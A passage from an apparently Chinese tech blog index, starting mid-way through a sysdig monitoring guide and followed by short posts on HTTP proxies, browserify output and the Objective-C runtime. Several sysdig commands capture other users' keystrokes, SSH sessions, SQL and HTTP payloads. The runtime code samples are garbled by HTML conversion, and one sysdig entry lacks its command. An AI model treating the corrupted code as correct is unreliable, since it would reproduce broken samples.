&lt;evt.args&gt;</code><br><br>其中：<code>evt.time</code>为时间时间戳；<code>evt.cpu</code>为事件被捕获所处的CPU number；<code>proc.name</code>为事件产生的进程名；<code>thread.tid</code>为事件产生的TID，相对于单线程进程来说就是它的PID；<code>evt.dir</code>为事件的方向，<code>&gt;</code>为事件进入，<code>&lt;</code>为事件退出；<code>evt.type</code>为事件的名称，例如’<code>open</code>‘或者’<code>read</code>‘；<code>evt.args</code>则是事件参数列表。<br><br>可利用<code>-p</code>指定输出格式，也可用使用’<code>sysdig -l</code>‘列出所有的字段。<br><h3>Filtering</h3><br>可在命令行的结尾设定sysdig过滤器。最简单的过滤器就是一个简单的域值检测：<br><blockquote>$ sysdig proc.name=cat</blockquote><br>利用’<code>sysdig -l</code>‘可得到所有可用的字段。以下对比操作符皆可用来检测相关内容：<code>=</code>，<code>!=</code>，<code>&lt;</code>，<code>&lt;=</code>，<code>&gt;</code>，<code>&gt;=</code>和<code>contains</code>。例如：<br><blockquote>$ sysdig fd.name contains /etc</blockquote><br>可使用括号和布尔运算符<code>and</code>，<code>or</code>，<code>not</code>进行多重检测：<br><blockquote>$ sysdig “not(fd.name contains /proc or fd.name contains /dev)”</blockquote><br><h3>Chisels</h3><br>Sysdig中的chisels是分析sysdig事件流并执行有用的操作小脚本。如下输入可得到可用的chisel列表：<br><blockquote>$ sysdig –cl</blockquote><br>对于每一个chisel，你必须键入相应的名字和其预期的参数。可使用<code>-c</code>运行一个chisel，例如：<br><blockquote>$ sysdig –c topfiles_bytes</blockquote><br>如果一个chisel需要参数，可在chisel名后设定：<br><blockquote>$ sysdig –c spy_ip 192.168.1.157</blockquote><br>Chiesls可与filters联合使用：<br><blockquote>$ sysdig -c topfiles_bytes “not fd.name contains /dev”</blockquote><br><h2><a href="https://github.com/draios/sysdig/wiki/Sysdig%20Examples" target="_blank" rel="external">使用实例</a></h2><br><h3>Networking</h3><br><ul><br>    <li>在网络带宽使用方面查看top进程</li><br></ul><br><blockquote>sysdig -c topprocs_net</blockquote><br><ul><br>    <li>显示与主机192.168.0.1交换的网络数据</li><br></ul><br><blockquote>as binary: sysdig -s2000 -X -c echo_fds fd.cip=192.168.0.1 as ASCII: sysdig -s2000 -A -c echo_fds fd.cip=192.168.0.1</blockquote><br><ul><br>    <li>查看本地服务器top端口</li><br></ul><br><blockquote>in terms of established connections: sysdig -c fdcount_by fd.sport “evt.type=accept” in terms of total bytes: sysdig -c fdbytes_by fd.sport</blockquote><br><ul><br>    <li>查看top客服端IP</li><br></ul><br><blockquote>in terms of established connections sysdig -c fdcount_by fd.cip “evt.type=accept” in terms of total bytes sysdig -c fdbytes_by fd.cip</blockquote><br><ul><br>    <li>列出所有不是由apache服务的接入连接</li><br></ul><br><blockquote>sysdig -p”%proc.name %fd.name” “evt.type=accept and proc.name!=httpd”</blockquote><br><h3>Containers</h3><br><ul><br>    <li>查看运行在机器上的containers列表和他们的资源使用情况</li><br></ul><br><blockquote>sudo csysdig -vcontainers</blockquote><br><ul><br>    <li>查看container上下文中的进程列表</li><br></ul><br><blockquote>sudo csysdig -pc</blockquote><br><ul><br>    <li>查看wordpress1 container内运行的进程的CPU使用率</li><br></ul><br><blockquote>sudo sysdig -pc -c topprocs_cpu container.name=wordpress1</blockquote><br><ul><br>    <li>查看wordpress1 container内运行的进程的网络带宽占用率</li><br></ul><br><blockquote>sudo sysdig -pc -c topprocs_net container.name=wordpress1</blockquote><br><ul><br>    <li>查看wordpress1 container中使用着最大网络带宽的进程</li><br></ul><br><blockquote>sudo sysdig -pc -c topprocs_net container.name=wordpress1</blockquote><br><ul><br>    <li>查看wordpress1 container中I/O方面的top文件</li><br></ul><br><blockquote>sudo sysdig -pc -c topfiles_bytes container.name=wordpress1</blockquote><br><ul><br>    <li>查看wordpress1 container中的top网络连接</li><br></ul><br><blockquote>sudo sysdig -pc -c topconns container.name=wordpress1</blockquote><br><ul><br>    <li>显示所有在wordpress1 container中执行的交互式命令</li><br></ul><br><blockquote>sudo sysdig -pc -c spy_users container.name=wordpress1</blockquote><br><h3>Application</h3><br><ul><br>    <li>查看设备产生的所有HTTP GET请求</li><br></ul><br><blockquote>sudo sysdig -s 2000 -A -c echo_fds fd.port=80 and evt.buffer contains GET</blockquote><br><ul><br>    <li>查看设备产生的所有SQL select查询</li><br></ul><br><blockquote>sudo sysdig -s 2000 -A -c echo_fds evt.buffer contains SELECT</blockquote><br><ul><br>    <li>查看通过apache传到外部MySQL服务端的实时查询</li><br></ul><br><blockquote>sysdig -s 2000 -A -c echo_fds fd.sip=192.168.30.5 and proc.name=apache2 and evt.buffer contains SELECT</blockquote><br><h3>Disk I/O</h3><br><ul><br>    <li>查看在磁盘带宽使用方面的top进程</li><br></ul><br><blockquote>sysdig -c topprocs_file</blockquote><br><ul><br>    <li>列出正在使用大量文件的进程</li><br></ul><br><blockquote>sysdig -c fdcount_by proc.name “fd.type=file”</blockquote><br><ul><br>    <li>查看在读写字节方面的top文件</li><br></ul><br><blockquote>sysdig -c topfiles_bytes</blockquote><br><ul><br>    <li>打印出apache已经读取或者写入的top文件</li><br></ul><br><blockquote>sysdig -c topfiles_bytes proc.name=httpd</blockquote><br><ul><br>    <li>基本的open监控，监控文件open操作</li><br></ul><br><blockquote>sysdig -p “%12user.name %6proc.pid %12proc.name %3fd.num %fd.typechar %fd.name” evt.type=open</blockquote><br><ul><br>    <li>查看在读写磁盘活动方面的top目录</li><br></ul><br><blockquote>sysdig -c fdbytes_by fd.directory “fd.type=file”</blockquote><br><ul><br>    <li>查看在/tmp目录下读写磁盘活动的top目录</li><br></ul><br><blockquote>sysdig -c fdbytes_by fd.filename “fd.directory=/tmp/“</blockquote><br><ul><br>    <li>观察所有名为’passwd’文件的I/O活动</li><br></ul><br><blockquote>sysdig -A -c echo_fds “fd.filename=passwd”</blockquote><br><ul><br>    <li>以FD type显示I/O活动</li><br></ul><br><blockquote>sysdig -c fdbytes_by fd.type</blockquote><br><h3>Processes and CPU usage</h3><br><ul><br>    <li>查看在CPU使用率方面的top进程</li><br></ul><br><blockquote>sysdig -c topprocs_cpu</blockquote><br><ul><br>    <li>查看一个进程的标准输出</li><br></ul><br><blockquote>sysdig -s4096 -A -c stdout proc.name=cat</blockquote><br><h3>Performance and Errors</h3><br><ul><br>    <li>查看花销了大量时间的文件</li><br></ul><br><blockquote>sysdig -c topfiles_time</blockquote><br><ul><br>    <li>查看apache花销了大量时间的文件</li><br></ul><br><blockquote>sysdig -c topfiles_time proc.name=httpd</blockquote><br><ul><br>    <li>查看在I/O错误方面的top进程</li><br></ul><br><blockquote>sysdig -c topprocs_errors</blockquote><br><ul><br>    <li>查看在I/O错误方面的top文件</li><br></ul><br><blockquote>sysdig -c topfiles_errors</blockquote><br><ul><br>    <li>查看所有失败的磁盘I/O调用</li><br></ul><br><blockquote>sysdig fd.type=file and evt.failed=true</blockquote><br><ul><br>    <li>查看httpd所有失败的文件open</li><br></ul><br><blockquote>sysdig “proc.name=httpd and evt.type=open and evt.failed=true”</blockquote><br><ul><br>    <li>查看花销时间最长的系统调用</li><br></ul><br><blockquote>See the system calls where most time has been spent</blockquote><br><ul><br>    <li>查看那些返回错误的系统调用</li><br></ul><br><blockquote>sysdig -c topscalls “evt.failed=true”</blockquote><br><ul><br>    <li>监控失败的文件open操作</li><br></ul><br><blockquote>sysdig -p “%12user.name %6proc.pid %12proc.name %3fd.num %fd.typechar %fd.name” evt.type=open and evt.failed=true</blockquote><br><ul><br>    <li>打印出延时超过1ms的文件I/O调用：</li><br></ul><br><blockquote>sysdig -c fileslower 1</blockquote><br><h3>Security</h3><br><ul><br>    <li>显示出”root”用户访问的目录</li><br></ul><br><blockquote>sysdig -p”%evt.arg.path” “evt.type=chdir and user.name=root”</blockquote><br><ul><br>    <li>观察ssh活动</li><br></ul><br><blockquote>sysdig -A -c echo_fds fd.name=/dev/ptmx and proc.name=sshd</blockquote><br><ul><br>    <li>显示出在<code>/etc</code>目录下的每一个文件open操作</li><br></ul><br><blockquote>sysdig evt.type=open and fd.name contains /etc</blockquote><br><ul><br>    <li>显示出所有使用了”tar”命令的login shell的ID</li><br></ul><br><blockquote>sysdig -r file.scap -c list_login_shells tar</blockquote><br><ul><br>    <li>显示出给定ID的login shell执行的所有命令</li><br></ul><br><blockquote>sysdig -r trace.scap.gz -c spy_users proc.loginshellid=5459</blockquote><br><ul><br>    <li>使用sysdig的取证分析案例：<br><ul><br>    <li><a href="http://draios.com/fishing-for-hackers/" target="_blank" rel="external">Fishing for Hackers: Analysis of a Linux Server Attack</a></li><br>    <li><a href="http://draios.com/fishing-for-hackers-part-2/" target="_blank" rel="external">Fishing for Hackers (Part 2): Quickly Identify Suspicious Activity With Sysdig</a></li><br>    <li></li><br></ul><br></li><br></ul><br>&nbsp;<br><br><br><div><br><div><a name="colloct-button"></a></div><br></div>
      
    </div>
    <div class="article-info article-info-index">
      
      <a href="/2016/03/30/［转］Fishing-for-Hackers-Analysis-of-a-Linux-Server-Attack/" class="archive-article-date">
  	<time datetime="2016-03-30T08:23:54.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-03-30</time>
</a>
      
      
	<div class="article-category tagcloud">
	<i class="icon-price-tags"></i>
	<a class="article-category-link" href="/categories/WebDev/">WebDev</a>
	</div>


      <div class="clearfix"></div>
    </div>
  </div>
</article>










  
    <article id="post-HTTP代理原理及实现" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/03/15/HTTP代理原理及实现/">HTTP代理原理及实现</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><a style="line-height: 1.5em;" href="http://img.pickbox.me/wp-content/uploads/HTTP代理原理及实现（一）.pdf" target="_blank" rel="external">HTTP代理原理及实现（一）</a></p>
<p><a href="http://img.pickbox.me/wp-content/uploads/HTTP代理原理及实现（二）.pdf" target="_blank" rel="external">HTTP代理原理及实现（二）</a></p>
<p><a href="http://img.pickbox.me/wp-content/uploads/Http代理请求头中的Proxy-Connection和Request-URL.pdf" target="_blank" rel="external">Http代理请求头中的Proxy-Connection和Request-URL</a></p>
<p>&nbsp;</p>
<p>参考：</p>
<p><a href="https://imququ.com/post/the-proxy-connection-header-in-http-request.html" target="_blank" rel="external">https://imququ.com/post/the-proxy-connection-header-in-http-request.html</a></p>
<p>&nbsp;</p>

      
    </div>
    <div class="article-info article-info-index">
      
      <a href="/2016/03/15/HTTP代理原理及实现/" class="archive-article-date">
  	<time datetime="2016-03-15T04:20:41.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-03-15</time>
</a>
      
      
	<div class="article-category tagcloud">
	<i class="icon-price-tags"></i>
	<a class="article-category-link" href="/categories/Network/">Network</a>
	</div>


      <div class="clearfix"></div>
    </div>
  </div>
</article>










  
    <article id="post-mink：浏览器模拟" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/03/14/mink：浏览器模拟/">mink：浏览器模拟</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>Travis-CI：自动化安装环境、运行脚本<br>behat+mink：测试网页、模拟加载/操作网页、顺序执行task并判断是否满足预期</p>
<p><a href="http://img.pickbox.me/wp-content/uploads/mink_scenario_1.png" target="_blank" rel="external"><img class="alignnone size-full wp-image-1205" alt="mink_scenario_1" src="http://img.pickbox.me/wp-content/uploads/mink_scenario_1.png" width="567" height="412"></a></p>
<p><a href="http://img.pickbox.me/wp-content/uploads/mink_scenario_2.png" target="_blank" rel="external"><img class="alignnone size-full wp-image-1206" alt="mink_scenario_2" src="http://img.pickbox.me/wp-content/uploads/mink_scenario_2.png" width="567" height="412"></a></p>
<p>参考：<br>developing web applications with behat and mink：<br><a href="http://docs.behat.org/en/v2.5/cookbook/behat_and_mink.html" target="_blank" rel="external">http://docs.behat.org/en/v2.5/cookbook/behat_and_mink.html</a></p>
<p>Automating Behat and Mink tests with Travis CI<br><a href="http://robbiemackay.com/2013/05/03/automating-behat-and-mink-tests-with-travis-ci/" target="_blank" rel="external">http://robbiemackay.com/2013/05/03/automating-behat-and-mink-tests-with-travis-ci/</a></p>

      
    </div>
    <div class="article-info article-info-index">
      
      <a href="/2016/03/14/mink：浏览器模拟/" class="archive-article-date">
  	<time datetime="2016-03-13T16:14:44.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-03-14</time>
</a>
      
      
	<div class="article-category tagcloud">
	<i class="icon-price-tags"></i>
	<a class="article-category-link" href="/categories/python-js-php-html-mysql-http/">python/js/php/html/mysql/http</a>
	</div>


      <div class="clearfix"></div>
    </div>
  </div>
</article>










  
    <article id="post-移动端高清、多屏适配方案-移动端-H5" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/03/04/移动端高清、多屏适配方案-移动端-H5/">移动端高清、多屏适配方案 - 移动端 H5</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><a href="http://img.pickbox.me/wp-content/uploads/移动端高清、多屏适配方案-移动端-H5-前端乱炖.pdf" target="_blank" rel="external">移动端高清、多屏适配方案 - 移动端 H5 - 前端乱炖</a></p>

      
    </div>
    <div class="article-info article-info-index">
      
      <a href="/2016/03/04/移动端高清、多屏适配方案-移动端-H5/" class="archive-article-date">
  	<time datetime="2016-03-04T06:35:57.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-03-04</time>
</a>
      
      
	<div class="article-category tagcloud">
	<i class="icon-price-tags"></i>
	<a class="article-category-link" href="/categories/python-js-php-html-mysql-http/">python/js/php/html/mysql/http</a>
	</div>


      <div class="clearfix"></div>
    </div>
  </div>
</article>










  
    <article id="post-How-can-I-Configure-Memcache-on-XAMPP-in-Linux" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/11/18/How-can-I-Configure-Memcache-on-XAMPP-in-Linux/">How can I Configure Memcache on XAMPP in Linux</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><a href="http://img.pickbox.me/wp-content/uploads/How-can-I-Configure-Memcache-on-XAMPP-in-Linux.pdf" target="_blank" rel="external">How can I Configure Memcache on XAMPP in Linux</a></p>

      
    </div>
    <div class="article-info article-info-index">
      
      <a href="/2015/11/18/How-can-I-Configure-Memcache-on-XAMPP-in-Linux/" class="archive-article-date">
  	<time datetime="2015-11-18T09:42:55.000Z" itemprop="datePublished"><i class="icon-clock"></i>2015-11-18</time>
</a>
      
      
	<div class="article-category tagcloud">
	<i class="icon-price-tags"></i>
	<a class="article-category-link" href="/categories/WebDev/">WebDev</a>
	</div>


      <div class="clearfix"></div>
    </div>
  </div>
</article>










  
    <article id="post-browserify生成代码" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/10/14/browserify生成代码/">browserify生成代码</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>browserify test.js test2.js -o bundle.js </p>
<pre>
(function outer (modules, cache, entry) {
    // Save the require from previous bundle to this closure if any
    var previousRequire = typeof require == &quot;function&quot; && require;

    function newRequire(name, jumped){
        if(!cache[name]) {
            if(!modules[name]) {
                // if we cannot find the the module within our internal map or
                // cache jump to the current global require ie. the last bundle
                // that was added to the page.
                var currentRequire = typeof require == &quot;function&quot; && require;
                if (!jumped && currentRequire) return currentRequire(name, true);

                // If there are other bundles on this page the require from the
                // previous one is saved to 'previousRequire'. Repeat this as
                // many times as there are bundles until the module is found or
                // we exhaust the require chain.
                if (previousRequire) return previousRequire(name, true);
                throw new Error('Cannot find module \'' + name + '\'');
            }
            var m = cache[name] = {exports:{}};
            modules[name][0].call(m.exports, function(x){
                var id = modules[name][1][x];
                return newRequire(id ? id : x);
            },m,m.exports,outer,modules,cache,entry);
        }
        return cache[name].exports;
    }
    for(var i=0;i&lt;entry.length;i++) newRequire(entry[i]);

    // Override the current require with this new one
    return newRequire;
})({
    1 : [function(require, module, exports) {
        function a() {}

        module.exports = a;

    },
    {}],
    2 : [function(require, module, exports) {
        var a = require('./test.js');
        function b() {}
        module.exports = b;

    },
    {
        &quot;./test.js&quot;: 1
    }]
},
{},
[1, 2]);
</pre>

<p>browerify自动添加的代码模板参考<a href="https://github.com/substack/browser-pack/blob/d29fddc8a9207d5f967664935073b50971aff708/prelude.js" target="_blank">prelude.js</a></p>

      
    </div>
    <div class="article-info article-info-index">
      
      <a href="/2015/10/14/browserify生成代码/" class="archive-article-date">
  	<time datetime="2015-10-14T02:23:34.000Z" itemprop="datePublished"><i class="icon-clock"></i>2015-10-14</time>
</a>
      
      
	<div class="article-category tagcloud">
	<i class="icon-price-tags"></i>
	<a class="article-category-link" href="/categories/js-html-python/">js/html/python</a>
	</div>


      <div class="clearfix"></div>
    </div>
  </div>
</article>










  
    <article id="post-Objective-C-Runtime-－-Self-Super-Class-Meta-Class" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/08/20/Objective-C-Runtime-－-Self-Super-Class-Meta-Class/">Objective-C Runtime － Self, Super Class, Meta Class</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><a href="http://img.pickbox.me/wp-content/uploads/ObjC_class_diagram.png" target="_blank" rel="external"><img src="http://img.pickbox.me/wp-content/uploads/ObjC_class_diagram.png" alt="ObjC_class_diagram" width="664" height="692" class="alignnone size-full wp-image-1183"></a></p>
<pre>
//Test.m
@implementation Test

#define ClsLog(tag, cls, isaCls) NSLog(@&quot;%30s %s&lt;%p&gt;, isa:%s&lt;%p&gt;&quot;, tag, class_getName(cls), cls, object_getClassName(cls), isaCls)

- (void)test {
    Class cls = [self class];
    Class isaCls = object_getClass(cls);
    ClsLog(&quot;[self class]&quot;, cls, isaCls);

    cls = [super class];
    isaCls = object_getClass(cls);
    ClsLog(&quot;[super class]&quot;, cls, isaCls);

    cls = [self superclass];
    isaCls = object_getClass(cls);
    ClsLog(&quot;[self superclass]&quot;, cls, isaCls);

    cls = [super superclass];
    isaCls = object_getClass(cls);
    ClsLog(&quot;[super superclass]&quot;, cls, isaCls);

    cls = [Test superclass];
    isaCls = object_getClass(cls);
    ClsLog(&quot;[Test superclass]&quot;, cls, isaCls);

    cls = [Test class];
    isaCls = object_getClass(cls);
    ClsLog(&quot;[Test class]&quot;, cls, isaCls);

    cls = objc_getMetaClass(&quot;Test&quot;);
    isaCls = object_getClass(cls);
    ClsLog(&quot;[Test meta]&quot;, cls, isaCls);

    cls = objc_getMetaClass(object_getClassName(cls));
    isaCls = object_getClass(cls);
    ClsLog(&quot;[Test meta isa]&quot;, cls, isaCls);

    cls = [cls superclass];
    isaCls = object_getClass(cls);
    ClsLog(&quot;[Test meta isa superclass]&quot;, cls, isaCls);
}

@end
</pre>

<pre>
            [self class] Test&lt;0x105e001f8&gt;, isa:Test&lt;0x105e00220&gt;
           [super class] Test&lt;0x105e001f8&gt;, isa:Test&lt;0x105e00220&gt;
         [self supercls] NSObject&lt;0x10654dd28&gt;, isa:NSObject&lt;0x10654dd50&gt;
        [super supercls] NSObject&lt;0x10654dd28&gt;, isa:NSObject&lt;0x10654dd50&gt;
         [Test supercls] NSObject&lt;0x10654dd28&gt;, isa:NSObject&lt;0x10654dd50&gt;
            [Test class] Test&lt;0x105e001f8&gt;, isa:Test&lt;0x105e00220&gt;
             [Test meta] Test&lt;0x105e00220&gt;, isa:NSObject&lt;0x10654dd50&gt;
         [Test meta isa] NSObject&lt;0x10654dd50&gt;, isa:NSObject&lt;0x10654dd50&gt;
[Test meta isa supercls] NSObject&lt;0x10654dd28&gt;, isa:NSObject&lt;0x10654dd50&gt;
</pre>

<pre>
//runtime/NSObject.mm
@implementation NSObject

+ (Class)class {
    return self;
}

- (Class)class {
    return object_getClass(self);
}

+ (Class)superclass {
    return self-&gt;superclass;
}

- (Class)superclass {
    return [self class]-&gt;superclass;
}

@end

//runtime/objc-class.mm
Class object_getClass(id obj)
{
    if (obj) return obj-&gt;getIsa();
    else return Nil;
}

////
const char *object_getClassName(id obj)
{
    return class_getName(obj ? obj-&gt;getIsa() : nil);
}

const char *class_getName(Class cls)
{
    if (!cls) return &quot;nil&quot;;
    assert(cls-&gt;isRealized()  ||  cls-&gt;isFuture());
    return cls-&gt;demangledName();
}
</pre>
      
    </div>
    <div class="article-info article-info-index">
      
      <a href="/2015/08/20/Objective-C-Runtime-－-Self-Super-Class-Meta-Class/" class="archive-article-date">
  	<time datetime="2015-08-20T08:44:22.000Z" itemprop="datePublished"><i class="icon-clock"></i>2015-08-20</time>
</a>
      
      
	<div class="article-category tagcloud">
	<i class="icon-price-tags"></i>
	<a class="article-category-link" href="/categories/iOS/">iOS</a>
	</div>


      <div class="clearfix"></div>
    </div>
  </div>
</article>










  
    <article id="post-iOS-runtime理解" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/08/13/iOS-runtime理解/">iOS runtime理解</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p></p><h1>iOS~runtime理解</h1><p></p>
<div>原文链接：<a href="http://www.jianshu.com/p/927c8384855a" target="_blank" rel="external">http://www.jianshu.com/p/927c8384855a</a></div><br><div>PDF下载：<a href="http://img.pickbox.me/wp-content/uploads/iOS_runtime理解.pdf" target="_blank" rel="external">iOS_runtime理解</a></div><br><div><br><blockquote>Runtime是想要做好iOS开发，或者说是真正的深刻的掌握OC这门语言所必需理解的东西。最近在学习Runtime，有自己的一些心得，整理如下，<br>一为 查阅方便<br>二为 或许能给他人一些启发，<br>三为 希望得到大家对这篇整理不足之处的一些指点。</blockquote><br><h2>什么是Runtime</h2><br><ul><br>    <li>我们写的代码在程序运行过程中都会被转化成runtime的C代码执行，例如<code>[target doSomething];</code>会被转化成<code>objc_msgSend(target, @selector(doSomething));</code>。</li><br>    <li>OC中一切都被设计成了对象，我们都知道一个类被初始化成一个实例，这个实例是一个对象。实际上一个类本质上也是一个对象，在runtime中用结构体表示。</li><br>    <li>相关的定义：</li><br></ul><br><pre><code>/// 描述类中的一个方法<br>typedef struct objc_method <em>Method;<br><br>/// 实例变量<br>typedef struct objc_ivar </em>Ivar;<br><br>/// 类别Category<br>typedef struct objc_category <em>Category;<br><br>/// 类中声明的属性<br>typedef struct objc_property </em>objc_property_t;</code></pre><br><ul><br>    <li>类在runtime中的表示</li><br></ul><br><pre><code>//类在runtime中的表示<br>struct objc_class {<br>    Class isa;//指针，顾名思义，表示是一个什么，<br>    //实例的isa指向类对象，类对象的isa指向元类<br><br>#if !<strong>OBJC2</strong><br>    Class super_class;  //指向父类<br>    const char <em>name;  //类名<br>    long version;<br>    long info;<br>    long instance_size<br>    struct objc_ivar_list </em>ivars //成员变量列表<br>    struct objc_method_list <strong>methodLists; //方法列表<br>    struct objc_cache <em>cache;//缓存<br>    //一种优化，调用过的方法存入缓存列表，下次调用先找缓存<br>    struct objc_protocol_list </em>protocols //协议列表<br>    #endif<br>} OBJC2_UNAVAILABLE;<br>/<em> Use <code>Class</code> instead of `struct objc_class </em>` <em>/</em></strong></code></pre><br><h2>获取列表</h2><br>有时候会有这样的需求，我们需要知道当前类中每个属性的名字（比如字典转模型，字典的Key和模型对象的属性名字不匹配）。<br>我们可以通过runtime的一系列方法获取类的一些信息（包括属性列表，方法列表，成员变量列表，和遵循的协议列表）。<br><pre><code>  unsigned int count;<br>    //获取属性列表<br>    objc_property_t propertyList = class_copyPropertyList([self class], &amp;count);<br>    for (unsigned int i=0; i&lt;count; i++) {<br>        const char <em>propertyName = property_getName(propertyList[i]);<br>        NSLog(@”property—-&gt;%@”, [NSString stringWithUTF8String:propertyName]);<br>    }<br><br>    //获取方法列表<br>    Method </em>methodList = class_copyMethodList([self class], &amp;count);<br>    for (unsigned int i; i&lt;count; i++) {<br>        Method method = methodList[i];<br>        NSLog(@”method—-&gt;%@”, NSStringFromSelector(method_getName(method)));<br>    }<br><br>    //获取成员变量列表<br>    Ivar <em>ivarList = class_copyIvarList([self class], &amp;count);<br>    for (unsigned int i; i&lt;count; i++) {<br>        Ivar myIvar = ivarList[i];<br>        const char </em>ivarName = ivar_getName(myIvar);<br>        NSLog(@”Ivar—-&gt;%@”, [NSString stringWithUTF8String:ivarName]);<br>    }<br><br>    //获取协议列表<br>    __unsafe_unretained Protocol protocolList = class_copyProtocolList([self class], &amp;count);<br>    for (unsigned int i; i&lt;count; i++) {<br>        Protocol <em>myProtocal = protocolList[i];<br>        const char </em>protocolName = protocol_getName(myProtocal);<br>        NSLog(@”protocol—-&gt;%@”, [NSString stringWithUTF8String:protocolName]);<br>    }</code></pre><br>在Xcode上跑一下看看输出吧，需要给你当前的类写几个属性，成员变量，方法和协议，不然获取的列表是没有东西的。<br>注意，调用这些获取列表的方法别忘记导入头文件<code>#import &lt;objc/runtime.h&gt;</code>。<br><h2>方法调用</h2><br>让我们看一下方法调用在运行时的过程（参照前文类在runtime中的表示）<br><br><strong>如果用实例对象调用实例方法，会到实例的isa指针指向的对象（也就是类对象）操作。<br>如果调用的是类方法，就会到类对象的isa指针指向的对象（也就是元类对象）中操作。</strong><br><ol><br>    <li>首先，在相应操作的对象中的缓存方法列表中找调用的方法，如果找到，转向相应实现并执行。</li><br>    <li>如果没找到，在相应操作的对象中的方法列表中找调用的方法，如果找到，转向相应实现执行</li><br>    <li>如果没找到，去父类指针所指向的对象中执行1，2.</li><br>    <li>以此类推，如果一直到根类还没找到，转向拦截调用。</li><br>    <li>如果没有重写拦截调用的方法，程序报错。</li><br></ol><br><strong>以上的过程给我带来的启发：</strong><br><ul><br>    <li>重写父类的方法，并没有覆盖掉父类的方法，只是在当前类对象中找到了这个方法后就不会再去父类中找了。</li><br>    <li>如果想调用已经重写过的方法的父类的实现，只需使用<code>super</code>这个编译器标识，它会在运行时跳过在当前的类对象中寻找方法的过程。</li><br></ul><br><h2>拦截调用</h2><br>在方法调用中说到了，如果没有找到方法就会转向拦截调用。<br>那么什么是拦截调用呢。<br>拦截调用就是，在找不到调用的方法程序崩溃之前，你有机会通过重写<code>NSObject</code>的四个方法来处理。<br><pre><code>+ (BOOL)resolveClassMethod:(SEL)sel;<br>+ (BOOL)resolveInstanceMethod:(SEL)sel;<br>//后两个方法需要转发到其他的类处理<br>- (id)forwardingTargetForSelector:(SEL)aSelector;<br>- (void)forwardInvocation:(NSInvocation <em>)anInvocation;</em></code></pre><br><ul><br>    <li>第一个方法是当你调用一个不存在的类方法的时候，会调用这个方法，默认返回NO，你可以加上自己的处理然后返回YES。</li><br>    <li>第二个方法和第一个方法相似，只不过处理的是实例方法。</li><br>    <li>第三个方法是将你调用的不存在的方法重定向到一个其他声明了这个方法的类，只需要你返回一个有这个方法的target。</li><br>    <li>第四个方法是将你调用的不存在的方法打包成<code>NSInvocation</code>传给你。做完你自己的处理后，调用<code>invokeWithTarget:</code>方法让某个target触发这个方法。</li><br></ul><br><h2>动态添加方法</h2><br>重写了拦截调用的方法并且返回了YES，我们要怎么处理呢？<br>有一个办法是根据传进来的<code>SEL</code>类型的selector动态添加一个方法。<br><br>首先从外部隐式调用一个不存在的方法：<br><pre><code>//隐式调用方法<br>[target performSelector:@selector(resolveAdd:) withObject:@”test”];</code></pre><br>然后，在target对象内部重写拦截调用的方法，动态添加方法。<br><pre><code>void runAddMethod(id self, SEL _cmd, NSString string){<br>    NSLog(@”add C IMP “, string);<br>}<br>+ (BOOL)resolveInstanceMethod:(SEL)sel{<br><br>    //给本类动态添加一个方法<br>    if ([NSStringFromSelector(sel) isEqualToString:@”resolveAdd:”]) {<br>        class_addMethod(self, sel, (IMP)runAddMethod, “v@:<em>“);<br>    }<br>    return YES;<br>}</em></code></pre><br>其中<code>class_addMethod</code>的四个参数分别是：<br><ol><br>    <li><code>Class cls</code> 给哪个类添加方法，本例中是self</li><br>    <li><code>SEL name</code> 添加的方法，本例中是重写的拦截调用传进来的selector。</li><br>    <li><code>IMP imp</code> 方法的实现，C方法的方法实现可以直接获得。如果是OC方法，可以用<code>+ (IMP)instanceMethodForSelector:(SEL)aSelector;</code>获得方法的实现。</li><br>    <li><code>“v@:“</code>方法的签名，代表有一个参数的方法。</li><br></ol><br><h2>关联对象</h2><br>现在你准备用一个系统的类，但是系统的类并不能满足你的需求，你需要额外添加一个属性。<br>这种情况的一般解决办法就是继承。<br>但是，只增加一个属性，就去继承一个类，总是觉得太麻烦类。<br>这个时候，runtime的关联属性就发挥它的作用了。<br><pre><code>//首先定义一个全局变量，用它的地址作为关联对象的key<br>static char associatedObjectKey;<br>//设置关联对象<br>objc_setAssociatedObject(target, &amp;associatedObjectKey, @”添加的字符串属性”, OBJC_ASSOCIATION_RETAIN_NONATOMIC); //获取关联对象<br>NSString <em>string = objc_getAssociatedObject(target, &amp;associatedObjectKey);<br>NSLog(@”AssociatedObject = %@”, string);</em></code></pre><br><code>objc_setAssociatedObject</code>的四个参数：<br><ol><br>    <li><code>id object</code>给谁设置关联对象。</li><br>    <li><code>const void 